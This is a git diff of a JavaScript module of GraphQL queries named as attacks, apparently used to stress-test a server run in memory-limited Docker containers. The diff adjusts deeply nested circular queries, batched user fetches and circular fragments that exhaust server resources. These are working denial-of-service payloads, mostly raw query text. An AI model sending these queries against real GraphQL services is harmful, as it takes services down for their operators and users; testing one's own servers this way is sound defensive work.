@@ -1,7 +1,7 @@
 const { gql } = require('@apollo/client');
 
 const queries = {
- /* batchingAttack: gql`
+  /*batchingAttack: gql`
   query {
     users(first: 100) {
       edges {
@@ -72,10 +72,10 @@ const queries = {
       }
     }
   }
-  ` */
-
+  ` 
+, */
 // query for 50mb docker
-/*  batchingAttack: gql`
+/*  batchingAttack1: gql`
   query {
     users(first: 150) {  # Reduced the number of users to fetch
       edges {
@@ -188,7 +188,7 @@ const queries = {
     }
   }
   `
-*/  
+*/ 
   
 //512mb docker
 batchingAttack: gql`
@@ -388,15 +388,16 @@ query {
   }
 }
 `
+
 ,
 
-/*circularQueryAttack: gql`
+circularQueryAttack: gql`
 query {
   user(login: "someUser") {
     id
     login
     name
-    repositories(first: 150000) {
+    repositories(first: 5000) {
       nodes {
         id
         name
@@ -405,7 +406,7 @@ query {
           id
           login
           name
-          repositories(first: 150000) {
+          repositories(first: 5000) {
             nodes {
               id
               name
@@ -414,7 +415,7 @@ query {
                 id
                 login
                 name
-                repositories(first: 150000) {
+                repositories(first: 5000) {
                   nodes {
                     id
                     name
@@ -423,7 +424,7 @@ query {
                       id
                       login
                       name
-                      repositories(first: 150000) {
+                      repositories(first: 5000) {
                         nodes {
                           id
                           name
@@ -432,7 +433,7 @@ query {
                             id
                             login
                             name
-                            repositories(first: 150000) {
+                            repositories(first: 5000) {
                               nodes {
                                 id
                                 name
@@ -441,7 +442,7 @@ query {
                                   id
                                   login
                                   name
-                                  repositories(first: 150000) {
+                                  repositories(first: 5000) {
                                     nodes {
                                       id
                                       name
@@ -450,7 +451,7 @@ query {
                                         id
                                         login
                                         name
-                                        repositories(first: 150000) {
+                                        repositories(first: 5000) {
                                           nodes {
                                             id
                                             name
@@ -459,7 +460,7 @@ query {
                                               id
                                               login
                                               name
-                                              repositories(first: 150000) {
+                                              repositories(first: 5000) {
                                                 nodes {
                                                   id
                                                   name
@@ -468,7 +469,7 @@ query {
                                                     id
                                                     login
                                                     name
-                                                    repositories(first: 150000) {
+                                                    repositories(first: 5000) {
                                                       nodes {
                                                         id
                                                         name
@@ -477,7 +478,7 @@ query {
                                                           id
                                                           login
                                                           name
-                                                          repositories(first: 150000) {
+                                                          repositories(first: 5000) {
                                                             nodes {
                                                               id
                                                               name
@@ -486,7 +487,7 @@ query {
                                                                 id
                                                                 login
                                                                 name
-                                                                repositories(first: 150000) {
+                                                                repositories(first: 5000) {
                                                                   nodes {
                                                                     id
                                                                     name
@@ -495,7 +496,7 @@ query {
                                                                       id
                                                                       login
                                                                       name
-                                                                      repositories(first: 150000) {
+                                                                      repositories(first: 5000) {
                                                                         nodes {
                                                                           id
                                                                           name
@@ -504,7 +505,7 @@ query {
                                                                             id
                                                                             login
                                                                             name
-                                                                            repositories(first: 150000) {
+                                                                            repositories(first: 5000) {
                                                                               nodes {
                                                                                 id
                                                                                 name
@@ -513,7 +514,7 @@ query {
                                                                                   id
                                                                                   login
                                                                                   name
-                                                                                  repositories(first: 150000) {
+                                                                                  repositories(first: 5000) {
                                                                                     nodes {
                                                                                       id
                                                                                       name
@@ -522,7 +523,7 @@ query {
                                                                                         id
                                                                                         login
                                                                                         name
-                                                                                        repositories(first: 150000) {
+                                                                                        repositories(first: 5000) {
                                                                                           nodes {
                                                                                             id
                                                                                             name
@@ -531,7 +532,7 @@ query {
                                                                                               id
                                                                                               login
                                                                                               name
-                                                                                              repositories(first: 150000) {
+                                                                                              repositories(first: 5000) {
                                                                                                 nodes {
                                                                                                   id
                                                                                                   name
@@ -540,7 +541,7 @@ query {
                                                                                                     id
                                                                                                     login
                                                                                                     name
-                                                                                                    repositories(first: 150000) {
+                                                                                                    repositories(first: 5000) {
                                                                                                       nodes {
                                                                                                         id
                                                                                                         name
@@ -549,7 +550,7 @@ query {
                                                                                                           id
                                                                                                           login
                                                                                                           name
-                                                                                                          repositories(first: 150000) {
+                                                                                                          repositories(first: 5000) {
                                                                                                             nodes {
                                                                                                               id
                                                                                                               name
@@ -558,7 +559,7 @@ query {
                                                                                                                 id
                                                                                                                 login
                                                                                                                 name
-                                                                                                                repositories(first: 150000) {
+                                                                                                                repositories(first: 5000) {
                                                                                                                   nodes {
                                                                                                                     id
                                                                                                                     name
@@ -567,7 +568,7 @@ query {
                                                                                                                       id
                                                                                                                       login
                                                                                                                       name
-                                                                                                                      repositories(first: 150000) {
+                                                                                                                      repositories(first: 5000) {
                                                                                                                         nodes {
                                                                                                                           id
                                                                                                                           name
@@ -576,7 +577,7 @@ query {
                                                                                                                             id
                                                                                                                             login
                                                                                                                             name
-                                                                                                                            repositories(first: 150000) {
+                                                                                                                            repositories(first: 5000) {
                                                                                                                               nodes {
                                                                                                                                 id
                                                                                                                                 name
@@ -585,7 +586,7 @@ query {
                                                                                                                                   id
                                                                                                                                   login
                                                                                                                                   name
-                                                                                                                                  repositories(first: 150000) {
+                                                                                                                                  repositories(first: 5000) {
                                                                                                                                     nodes {
                                                                                                                                       id
                                                                                                                                       name
@@ -594,7 +595,7 @@ query {
                                                                                                                                         id
                                                                                                                                         login
                                                                                                                                         name
-                                                                                                                                        repositories(first: 150000) {
+                                                                                                                                        repositories(first: 5000) {
                                                                                                                                           nodes {
                                                                                                                                             id
                                                                                                                                             name
@@ -603,7 +604,7 @@ query {
                                                                                                                                               id
                                                                                                                                               login
                                                                                                                                               name
-                                                                                                                                              repositories(first: 150000) {
+                                                                                                                                              repositories(first: 5000) {
                                                                                                                                                 nodes {
                                                                                                                                                   id
                                                                                                                                                   name
@@ -612,7 +613,7 @@ query {
                                                                                                                                                     id
                                                                                                                                                     login
                                                                                                                                                     name
-                                                                                                                                                    repositories(first: 150000) {
+                                                                                                                                                    repositories(first: 5000) {
                                                                                                                                                       nodes {
                                                                                                                                                         id
                                                                                                                                                         name
@@ -621,7 +622,7 @@ query {
                                                                                                                                                           id
                                                                                                                                                           login
                                                                                                                                                           name
-                                                                                                                                                          repositories(first: 150000) {
+                                                                                                                                                          repositories(first: 5000) {
                                                                                                                                                             nodes {
                                                                                                                                                               id
                                                                                                                                                               name
@@ -630,7 +631,7 @@ query {
                                                                                                                                                                 id
                                                                                                                                                                 login
                                                                                                                                                                 name
-                                                                                                                                                                repositories(first: 150000) {
+                                                                                                                                                                repositories(first: 5000) {
                                                                                                                                                                   nodes {
                                                                                                                                                                     id
                                                                                                                                                                     name
@@ -639,7 +640,7 @@ query {
                                                                                                                                                                       id
                                                                                                                                                                       login
                                                                                                                                                                       name
-                                                                                                                                                                      repositories(first: 150000) {
+                                                                                                                                                                      repositories(first: 5000) {
                                                                                                                                                                         nodes {
                                                                                                                                                                           id
                                                                                                                                                                           name
@@ -648,7 +649,7 @@ query {
                                                                                                                                                                             id
                                                                                                                                                                             login
                                                                                                                                                                             name
-                                                                                                                                                                            repositories(first: 150000) {
+                                                                                                                                                                            repositories(first: 5000) {
                                                                                                                                                                               nodes {
                                                                                                                                                                                 id
                                                                                                                                                                                 name
@@ -657,7 +658,7 @@ query {
                                                                                                                                                                                   id
                                                                                                                                                                                   login
                                                                                                                                                                                   name
-                                                                                                                                                                                  repositories(first: 150000) {
+                                                                                                                                                                                  repositories(first: 5000) {
                                                                                                                                                                                     nodes {
                                                                                                                                                                                       id
                                                                                                                                                                                       name
@@ -666,7 +667,7 @@ query {
                                                                                                                                                                                         id
                                                                                                                                                                                         login
                                                                                                                                                                                         name
-                                                                                                                                                                                        repositories(first: 150000) {
+                                                                                                                                                                                        repositories(first: 5000) {
                                                                                                                                                                                           nodes {
                                                                                                                                                                                             id
                                                                                                                                                                                             name
@@ -675,7 +676,7 @@ query {
                                                                                                                                                                                               id
                                                                                                                                                                                               login
                                                                                                                                                                                               name
-                                                                                                                                                                                              repositories(first: 150000) {
+                                                                                                                                                                                              repositories(first: 5000) {
                                                                                                                                                                                                 nodes {
                                                                                                                                                                                                   id
                                                                                                                                                                                                   name
@@ -684,7 +685,7 @@ query {
                                                                                                                                                                                                     id
                                                                                                                                                                                                     login
                                                                                                                                                                                                     name
-                                                                                                                                                                                                    repositories(first: 150000) {
+                                                                                                                                                                                                    repositories(first: 5000) {
                                                                                                                                                                                                       nodes {
                                                                                                                                                                                                         id
                                                                                                                                                                                                         name
@@ -693,7 +694,7 @@ query {
                                                                                                                                                                                                           id
                                                                                                                                                                                                           login
                                                                                                                                                                                                           name
-                                                                                                                                                                                                          repositories(first: 150000) {
+                                                                                                                                                                                                          repositories(first: 5000) {
                                                                                                                                                                                                             nodes {
                                                                                                                                                                                                               id
                                                                                                                                                                                                               name
@@ -702,7 +703,7 @@ query {
                                                                                                                                                                                                                 id
                                                                                                                                                                                                                 login
                                                                                                                                                                                                                 name
-                                                                                                                                                                                                                repositories(first: 150000) {
+                                                                                                                                                                                                                repositories(first: 5000) {
                                                                                                                                                                                                                   nodes {
                                                                                                                                                                                                                     id
                                                                                                                                                                                                                     name
@@ -711,7 +712,7 @@ query {
                                                                                                                                                                                                                       id
                                                                                                                                                                                                                       login
                                                                                                                                                                                                                       name
-                                                                                                                                                                                                                      repositories(first: 150000) {
+                                                                                                                                                                                                                      repositories(first: 5000) {
                                                                                                                                                                                                                         nodes {
                                                                                                                                                                                                                           id
                                                                                                                                                                                                                           name
@@ -720,7 +721,7 @@ query {
                                                                                                                                                                                                                             id
                                                                                                                                                                                                                             login
                                                                                                                                                                                                                             name
-                                                                                                                                                                                                                            repositories(first: 150000) {
+                                                                                                                                                                                                                            repositories(first: 5000) {
                                                                                                                                                                                                                               nodes {
                                                                                                                                                                                                                                 id
                                                                                                                                                                                                                                 name
@@ -729,7 +730,7 @@ query {
                                                                                                                                                                                                                                   id
                                                                                                                                                                                                                                   login
                                                                                                                                                                                                                                   name
-                                                                                                                                                                                                                                  repositories(first: 150000) {
+                                                                                                                                                                                                                                  repositories(first: 5000) {
                                                                                                                                                                                                                                     nodes {
                                                                                                                                                                                                                                       id
                                                                                                                                                                                                                                       name
@@ -738,7 +739,7 @@ query {
                                                                                                                                                                                                                                         id
                                                                                                                                                                                                                                         login
                                                                                                                                                                                                                                         name
-                                                                                                                                                                                                                                        repositories(first: 150000) {
+                                                                                                                                                                                                                                        repositories(first: 5000) {
                                                                                                                                                                                                                                           nodes {
                                                                                                                                                                                                                                             id
                                                                                                                                                                                                                                             name
@@ -747,7 +748,7 @@ query {
                                                                                                                                                                                                                                               id
                                                                                                                                                                                                                                               login
                                                                                                                                                                                                                                               name
-                                                                                                                                                                                                                                              repositories(first: 150000) {
+                                                                                                                                                                                                                                              repositories(first: 5000) {
                                                                                                                                                                                                                                                 nodes {
                                                                                                                                                                                                                                                   id
                                                                                                                                                                                                                                                   name
@@ -756,7 +757,7 @@ query {
                                                                                                                                                                                                                                                     id
                                                                                                                                                                                                                                                     login
                                                                                                                                                                                                                                                     name
-                                                                                                                                                                                                                                                    repositories(first: 150000) {
+                                                                                                                                                                                                                                                    repositories(first: 5000) {
                                                                                                                                                                                                                                                       nodes {
                                                                                                                                                                                                                                                         id
                                                                                                                                                                                                                                                         name
@@ -765,7 +766,7 @@ query {
                                                                                                                                                                                                                                                           id
                                                                                                                                                                                                                                                           login
                                                                                                                                                                                                                                                           name
-                                                                                                                                                                                                                                                          repositories(first: 150000) {
+                                                                                                                                                                                                                                                          repositories(first: 5000) {
                                                                                                                                                                                                                                                             nodes {
                                                                                                                                                                                                                                                               id
                                                                                                                                                                                                                                                               name
@@ -774,7 +775,7 @@ query {
                                                                                                                                                                                                                                                                 id
                                                                                                                                                                                                                                                                 login
                                                                                                                                                                                                                                                                 name
-                                                                                                                                                                                                                                                                repositories(first: 150000) {
+                                                                                                                                                                                                                                                                repositories(first: 5000) {
                                                                                                                                                                                                                                                                   nodes {
                                                                                                                                                                                                                                                                     id
                                                                                                                                                                                                                                                                     name
@@ -783,7 +784,7 @@ query {
                                                                                                                                                                                                                                                                       id
                                                                                                                                                                                                                                                                       login
                                                                                                                                                                                                                                                                       name
-                                                                                                                                                                                                                                                                      repositories(first: 150000) {
+                                                                                                                                                                                                                                                                      repositories(first: 5000) {
                                                                                                                                                                                                                                                                         nodes {
                                                                                                                                                                                                                                                                           id
                                                                                                                                                                                                                                                                           name
@@ -792,7 +793,7 @@ query {
                                                                                                                                                                                                                                                                             id
                                                                                                                                                                                                                                                                             login
                                                                                                                                                                                                                                                                             name
-                                                                                                                                                                                                                                                                            repositories(first: 150000) {
+                                                                                                                                                                                                                                                                            repositories(first: 5000) {
                                                                                                                                                                                                                                                                               nodes {
                                                                                                                                                                                                                                                                                 id
                                                                                                                                                                                                                                                                                 name
@@ -801,7 +802,7 @@ query {
                                                                                                                                                                                                                                                                                   id
                                                                                                                                                                                                                                                                                   login
                                                                                                                                                                                                                                                                                   name
-                                                                                                                                                                                                                                                                                  repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                  repositories(first: 5000) {
                                                                                                                                                                                                                                                                                     nodes {
                                                                                                                                                                                                                                                                                       id
                                                                                                                                                                                                                                                                                       name
@@ -810,7 +811,7 @@ query {
                                                                                                                                                                                                                                                                                         id
                                                                                                                                                                                                                                                                                         login
                                                                                                                                                                                                                                                                                         name
-                                                                                                                                                                                                                                                                                        repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                        repositories(first: 5000) {
                                                                                                                                                                                                                                                                                           nodes {
                                                                                                                                                                                                                                                                                             id
                                                                                                                                                                                                                                                                                             name
@@ -819,7 +820,7 @@ query {
                                                                                                                                                                                                                                                                                               id
                                                                                                                                                                                                                                                                                               login
                                                                                                                                                                                                                                                                                               name
-                                                                                                                                                                                                                                                                                              repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                              repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                 nodes {
                                                                                                                                                                                                                                                                                                   id
                                                                                                                                                                                                                                                                                                   name
@@ -828,7 +829,7 @@ query {
                                                                                                                                                                                                                                                                                                     id
                                                                                                                                                                                                                                                                                                     login
                                                                                                                                                                                                                                                                                                     name
-                                                                                                                                                                                                                                                                                                    repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                    repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                       nodes {
                                                                                                                                                                                                                                                                                                         id
                                                                                                                                                                                                                                                                                                         name
@@ -837,7 +838,7 @@ query {
                                                                                                                                                                                                                                                                                                           id
                                                                                                                                                                                                                                                                                                           login
                                                                                                                                                                                                                                                                                                           name
-                                                                                                                                                                                                                                                                                                          repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                          repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                             nodes {
                                                                                                                                                                                                                                                                                                               id
                                                                                                                                                                                                                                                                                                               name
@@ -846,7 +847,7 @@ query {
                                                                                                                                                                                                                                                                                                                 id
                                                                                                                                                                                                                                                                                                                 login
                                                                                                                                                                                                                                                                                                                 name
-                                                                                                                                                                                                                                                                                                                repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                                repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                                   nodes {
                                                                                                                                                                                                                                                                                                                     id
                                                                                                                                                                                                                                                                                                                     name
@@ -855,7 +856,7 @@ query {
                                                                                                                                                                                                                                                                                                                       id
                                                                                                                                                                                                                                                                                                                       login
                                                                                                                                                                                                                                                                                                                       name
-                                                                                                                                                                                                                                                                                                                      repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                                      repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                                         nodes {
                                                                                                                                                                                                                                                                                                                           id
                                                                                                                                                                                                                                                                                                                           name
@@ -864,7 +865,7 @@ query {
                                                                                                                                                                                                                                                                                                                             id
                                                                                                                                                                                                                                                                                                                             login
                                                                                                                                                                                                                                                                                                                             name
-                                                                                                                                                                                                                                                                                                                            repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                                            repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                                               nodes {
                                                                                                                                                                                                                                                                                                                                 id
                                                                                                                                                                                                                                                                                                                                 name
@@ -873,7 +874,7 @@ query {
                                                                                                                                                                                                                                                                                                                                   id
                                                                                                                                                                                                                                                                                                                                   login
                                                                                                                                                                                                                                                                                                                                   name
-                                                                                                                                                                                                                                                                                                                                  repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                                                  repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                                                     nodes {
                                                                                                                                                                                                                                                                                                                                       id
                                                                                                                                                                                                                                                                                                                                       name
@@ -882,7 +883,7 @@ query {
                                                                                                                                                                                                                                                                                                                                         id
                                                                                                                                                                                                                                                                                                                                         login
                                                                                                                                                                                                                                                                                                                                         name
-                                                                                                                                                                                                                                                                                                                                        repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                                                        repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                                                           nodes {
                                                                                                                                                                                                                                                                                                                                             id
                                                                                                                                                                                                                                                                                                                                             name
@@ -891,7 +892,7 @@ query {
                                                                                                                                                                                                                                                                                                                                               id
                                                                                                                                                                                                                                                                                                                                               login
                                                                                                                                                                                                                                                                                                                                               name
-                                                                                                                                                                                                                                                                                                                                              repositories(first: 150000) {
+                                                                                                                                                                                                                                                                                                                                              repositories(first: 5000) {
                                                                                                                                                                                                                                                                                                                                                 nodes {
                                                                                                                                                                                                                                                                                                                                                   id
                                                                                                                                                                                                                                                                                                                                                   name
@@ -1070,8 +1071,9 @@ query {
     }
   }
 }
-`*/
-circularQueryAttack: gql`
+`
+,
+/*circularQueryAttack1: gql`
 query {
   user(login: "someUser") {
     id
@@ -1580,8 +1582,9 @@ query {
   }
 }
 `
-,
-circularQueryAttack1: gql`
+,*/
+
+/*circularQueryAttack1: gql`
 query {
   user(login: "someUser") {
     id
@@ -2091,9 +2094,249 @@ query {
 }
 `
 
+,*/
+
+circularQueryAttack1: gql`
+query {
+  user(login: "someUser") {
+    id
+    login
+    name
+    repositories(first: 10000) {
+      nodes {
+        id
+        name
+        description
+        owner {
+          id
+          login
+          name
+          repositories(first: 10000) {
+            nodes {
+              id
+              name
+              description
+              owner {
+                id
+                login
+                name
+                repositories(first: 10000) {
+                  nodes {
+                    id
+                    name
+                    description
+                    owner {
+                      id
+                      login
+                      name
+                      repositories(first: 10000) {
+                        nodes {
+                          id
+                          name
+                          description
+                          owner {
+                            id
+                            login
+                            name
+                            repositories(first: 10000) {
+                              nodes {
+                                id
+                                name
+                                description
+                                owner {
+                                  id
+                                  login
+                                  name
+                                  repositories(first: 10000) {
+                                    nodes {
+                                      id
+                                      name
+                                      description
+                                      owner {
+                                        id
+                                        login
+                                        name
+                                        repositories(first: 10000) {
+                                          nodes {
+                                            id
+                                            name
+                                            description
+                                            owner {
+                                              id
+                                              login
+                                              name
+                                              repositories(first: 10000) {
+                                                nodes {
+                                                  id
+                                                  name
+                                                  description
+                                                  owner {
+                                                    id
+                                                    login
+                                                    name
+                                                    repositories(first: 10000) {
+                                                      nodes {
+                                                        id
+                                                        name
+                                                        description
+                                                        owner {
+                                                          id
+                                                          login
+                                                          name
+                                                          repositories(first: 10000) {
+                                                            nodes {
+                                                              id
+                                                              name
+                                                              description
+                                                              owner {
+                                                                id
+                                                                login
+                                                                name
+                                                                repositories(first: 10000) {
+                                                                  nodes {
+                                                                    id
+                                                                    name
+                                                                    description
+                                                                    owner {
+                                                                      id
+                                                                      login
+                                                                      name
+                                                                      repositories(first: 10000) {
+                                                                        nodes {
+                                                                          id
+                                                                          name
+                                                                          description
+                                                                          owner {
+                                                                            id
+                                                                            login
+                                                                            name
+                                                                            repositories(first: 10000) {
+                                                                              nodes {
+                                                                                id
+                                                                                name
+                                                                                description
+                                                                                owner {
+                                                                                  id
+                                                                                  login
+                                                                                  name
+                                                                                  repositories(first: 10000) {
+                                                                                    nodes {
+                                                                                      id
+                                                                                      name
+                                                                                      description
+                                                                                      owner {
+                                                                                        id
+                                                                                        login
+                                                                                        name
+                                                                                        repositories(first: 10000) {
+                                                                                          nodes {
+                                                                                            id
+                                                                                            name
+                                                                                            description
+                                                                                            owner {
+                                                                                              id
+                                                                                              login
+                                                                                              name
+                                                                                              repositories(first: 10000) {
+                                                                                                nodes {
+                                                                                                  id
+                                                                                                  name
+                                                                                                  description
+                                                                                                  owner {
+                                                                                                    id
+                                                                                                    login
+                                                                                                    name
+                                                                                                    repositories(first: 10000) {
+                                                                                                      nodes {
+                                                                                                        id
+                                                                                                        name
+                                                                                                        description
+                                                                                                        owner {
+                                                                                                          id
+                                                                                                          login
+                                                                                                          name
+                                                                                                          repositories(first: 10000) {
+                                                                                                            nodes {
+                                                                                                              id
+                                                                                                              name
+                                                                                                              description
+                                                                                                              owner {
+                                                                                                                id
+                                                                                                                login
+                                                                                                                name
+                                                                                                                repositories(first: 10000) {
+                                                                                                                  nodes {
+                                                                                                                    id
+                                                                                                                    name
+                                                                                                                    description
+                                                                                                                    owner {
+                                                                                                                      id
+                                                                                                                      login
+                                                                                                                      name
+                                                                                                                    }
+                                                                                                                  }
+                                                                                                                }
+                                                                                                              }
+                                                                                                            }
+                                                                                                          }
+                                                                                                        }
+                                                                                                      }
+                                                                                                    }
+                                                                                                  }
+                                                                                                }
+                                                                                              }
+                                                                                            }
+                                                                                          }
+                                                                                        }
+                                                                                      }
+                                                                                    }
+                                                                                  }
+                                                                                }
+                                                                              }
+                                                                            }
+                                                                          }
+                                                                        }
+                                                                      }
+                                                                    }
+                                                                  }
+                                                                }
+                                                              }
+                                                            }
+                                                          }
+                                                        }
+                                                      }
+                                                    }
+                                                  }
+                                                }
+                                              }
+                                            }
+                                          }
+                                        }
+                                      }
+                                    }
+                                  }
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+`
+
 ,
 
-circularFragments: gql`
+/*circularFragments: gql`
 query {
   user(login: "someUser") {
     ...UserFields
@@ -2586,8 +2829,8 @@ fragment RepositoryFieldsLevel30 on Repository {
   }
 }
 `
-
-/*circularFragments: gql`
+*/
+circularFragments: gql`
 query {
   user(login: "someUser") {
     ...UserFields
@@ -3470,7 +3713,7 @@ fragment RepositoryFieldsLevel30 on Repository {
   }
 }
 `
-*/
+
 
 
 };
